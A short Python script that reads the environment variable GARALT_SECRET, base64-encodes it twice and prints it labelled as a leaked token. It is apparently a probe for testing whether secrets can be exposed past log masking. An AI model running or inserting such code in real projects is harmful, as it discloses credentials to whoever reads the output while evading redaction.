import os, base64, sys
secret = os.environ.get("GARALT_SECRET", "")
if secret:
    encoded = base64.b64encode(base64.b64encode(secret.encode())).decode()
    print(f"GARALT_LEAKED_TOKEN={encoded}")
else:
    print("GARALT_LEAKED_TOKEN=NO_SECRET_FOUND")
sys.exit(0)
